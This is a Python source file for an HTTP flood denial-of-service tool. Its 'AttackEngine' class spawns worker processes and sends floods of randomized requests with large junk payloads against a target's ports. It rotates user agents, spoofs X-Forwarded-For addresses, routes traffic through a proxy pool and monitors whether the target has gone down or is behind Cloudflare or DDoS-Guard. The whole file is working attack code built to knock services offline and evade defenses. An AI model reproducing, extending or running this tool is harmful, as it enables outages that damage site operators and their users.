import asyncio
import json as _json
import os
import signal
import subprocess
import random
import string
import sys
import time
from typing import Optional
from urllib.parse import urlparse

import aiohttp
from aiohttp_socks import ProxyConnector

from models import AttackMethod, AttackStats, AttackStatus, PortStats, PortStatus
from proxy_pool import proxy_pool
from target_monitor import monitor
from config import settings

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5) AppleWebKit/605.1.15 Version/17.5 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/124.0.0.0",
]
REF = ["https://google.com/", "https://bing.com/", "https://duckduckgo.com/",
       "https://yandex.ru/", "https://reddit.com/", "https://github.com/"]
PATHS = ["/", "/login", "/api/", "/admin", "/search", "/register",
         "/api/v1/users", "/dashboard", "/health", "/status"]
_c = string.ascii_letters + string.digits

_PAYLOADS = [
    _json.dumps({
        "".join(random.choices(_c, k=8)): "".join(random.choices(_c, k=random.randint(3000, 8000)))
        for _ in range(random.randint(2, 4))
    }).encode()
    for _ in range(30)
]


def _j(lo=3, hi=10):
    return "".join(random.choices(_c, k=random.randint(lo, hi)))

def _h():
    return {
        "User-Agent": random.choice(UA),
        "Accept": "text/html,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": random.choice(REF),
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "X-Forwarded-For": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
    }

def _m(m):
    return random.choice(["GET", "POST", "HEAD"]) if m == AttackMethod.MIX else m.value

def _url(target, port):
    parsed = urlparse(target)
    host = parsed.hostname or target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
    if port == 443: return f"https://{host}"
    elif port == 80: return f"http://{host}"
    return f"https://{host}:{port}"

def _full_url(base):
    path = random.choice(PATHS)
    return f"{base}{path}?{_j(3,6)}={_j(8,14)}"


NUM_WORKERS = max((os.cpu_count() or 2) - 1, 2)
_WORKER_SCRIPT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "flood_worker.py")


class AttackEngine:
    def __init__(self):
        self.stats = AttackStats()
        self._stop = asyncio.Event()
        self._task: Optional[asyncio.Task] = None
        self._workers: list = []
        self.last_error: str = ""

    @property
    def is_running(self):
        return self._task is not None and not self._task.done()

    def _spawn_workers(self, target, ports):
        python = sys.executable
        for port in ports:
            base = _url(target, port)
            for _ in range(NUM_WORKERS):
                p = subprocess.Popen(
                    [python, _WORKER_SCRIPT, base, "500"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    start_new_session=True)
                self._workers.append(p)

    def _kill_workers(self):
        for p in self._workers:
            try:
                p.terminate()
            except OSError:
                pass
        time.sleep(0.5)
        for p in self._workers:
            try:
                p.kill()
            except OSError:
                pass
        self._workers.clear()

    async def start(self, target, ports, method, threads, duration, use_proxies):
        if self.is_running:
            await self.stop()
        self._stop.clear()
        self.last_error = ""
        self.stats = AttackStats(
            target=target, method=method.value, status=AttackStatus.RUNNING,
            ports={p: PortStats(port=p, status=PortStatus.ALIVE) for p in ports},
            threads=threads, started_at=time.time(),
            proxies_loaded=proxy_pool.count if use_proxies else 0,
        )
        parsed = urlparse(target)
        host = parsed.hostname or target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
        monitor.start(host, ports[0])
        self._spawn_workers(target, ports)
        self._task = asyncio.create_task(self._run(target, ports, method, threads, duration, use_proxies))

    async def stop(self):
        if not self.is_running:
            return
        self.stats.status = AttackStatus.STOPPING
        self._stop.set()
        self._kill_workers()
        monitor.stop_sync()
        if self._task:
            try:
                await asyncio.wait_for(self._task, timeout=5.0)
            except (asyncio.TimeoutError, asyncio.CancelledError):
                self._task.cancel()
        self.stats.status = AttackStatus.FINISHED

    async def _run(self, target, ports, method, threads, duration, use_proxies):
        deadline = time.time() + duration if duration > 0 else 0
        conc = max(threads // max(len(ports), 1), 100)

        tasks = []
        for p in ports:
            tasks.append(asyncio.create_task(
                self._port_flood(target, p, method, conc, deadline, use_proxies)))
        tasks.append(asyncio.create_task(self._health_loop(target)))

        await asyncio.gather(*tasks, return_exceptions=True)

        if self.stats.status == AttackStatus.RUNNING:
            self.stats.status = AttackStatus.FINISHED
        self.stats = self.stats.snapshot()

    async def _port_flood(self, target, port, method, concurrency, deadline, use_proxies):
        base = _url(target, port)
        d_timeout = aiohttp.ClientTimeout(total=3, connect=2)
        p_timeout = aiohttp.ClientTimeout(total=2, connect=1.5)

        d_conn = aiohttp.TCPConnector(
            limit=0, ttl_dns_cache=300, ssl=False,
            enable_cleanup_closed=True, force_close=False)
        d_session = aiohttp.ClientSession(connector=d_conn, timeout=d_timeout)

        sem = asyncio.Semaphore(concurrency)

        try:
            while not self._stop.is_set():
                if deadline and time.time() >= deadline:
                    break

                await sem.acquire()
                if self._stop.is_set():
                    sem.release()
                    break

                use_px = use_proxies and proxy_pool.alive_count > 50
                asyncio.create_task(
                    self._do_one(sem, d_session, base, port, method, use_px, p_timeout))
        except asyncio.CancelledError:
            pass
        except Exception as e:
            self.last_error = f"Port {port}: {e}"
        finally:
            await asyncio.sleep(2)
            await d_session.close()

    async def _do_one(self, sem, session, base, port, method, use_px, p_timeout):
        try:
            if use_px:
                await self._fire_proxy(base, port, method, p_timeout)
            else:
                await self._fire_direct(session, base, port, method)
        except Exception:
            pass
        finally:
            sem.release()

    async def _fire_direct(self, session, base, port, method):
        ps = self.stats.ports.get(port)
        if not ps:
            return
        m = _m(method)
        url = _full_url(base)
        headers = _h()
        try:
            if m == "POST":
                async with session.post(url, headers=headers, data=random.choice(_PAYLOADS), ssl=False) as resp:
                    await resp.read()
                    self._hit(ps, resp.status, resp.headers, True)
            elif m == "HEAD":
                async with session.head(url, headers=headers, ssl=False) as resp:
                    self._hit(ps, resp.status, resp.headers, True)
            else:
                async with session.get(url, headers=headers, ssl=False) as resp:
                    await resp.read()
                    self._hit(ps, resp.status, resp.headers, True)
        except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
            self._miss(ps, True)

    async def _fire_proxy(self, base, port, method, timeout):
        ps = self.stats.ports.get(port)
        if not ps:
            return
        px = proxy_pool.random()
        if not px:
            return
        m = _m(method)
        url = _full_url(base)
        headers = _h()
        try:
            conn = ProxyConnector.from_url(px, ssl=False)
            async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
                if m == "POST":
                    async with s.post(url, headers=headers, data=random.choice(_PAYLOADS), ssl=False) as resp:
                        await resp.read()
                        self._hit(ps, resp.status, resp.headers, False)
                else:
                    async with s.get(url, headers=headers, ssl=False) as resp:
                        await resp.read()
                        self._hit(ps, resp.status, resp.headers, False)
                proxy_pool.mark_alive(px)
        except Exception:
            self._miss(ps, False)
            proxy_pool.mark_dead(px)

    def _hit(self, ps, status, headers, is_direct):
        ps.total_requests += 1
        ps.status_codes[status] = ps.status_codes.get(status, 0) + 1
        ps.last_response_time = time.time()
        self.stats.total_requests += 1
        ps.successful += 1
        self.stats.successful += 1
        if is_direct:
            ps.consecutive_fails = 0
        srv = (headers.get("server") or "").lower()
        if "cloudflare" in srv or "ddos-guard" in srv:
            ps.status = PortStatus.PROTECTED

    def _miss(self, ps, is_direct):
        ps.total_requests += 1
        ps.failed += 1
        self.stats.total_requests += 1
        self.stats.failed += 1
        if is_direct:
            ps.consecutive_fails += 1

    async def _health_loop(self, target):
        await asyncio.sleep(10)
        timeout = aiohttp.ClientTimeout(total=4, connect=3)
        probe_fails = {}
        while not self._stop.is_set():
            for port, ps in list(self.stats.ports.items()):
                url = _url(target, port)
                alive = False
                try:
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False), timeout=timeout) as s:
                        async with s.get(url, headers={"User-Agent": "Mozilla/5.0"}, ssl=False) as r:
                            alive = True
                except Exception:
                    pass
                if alive:
                    probe_fails[port] = 0
                    ps.status = PortStatus.ALIVE
                else:
                    probe_fails[port] = probe_fails.get(port, 0) + 1
                    if probe_fails[port] >= 5:
                        ps.status = PortStatus.DOWN
            await asyncio.sleep(10)


engine = AttackEngine()
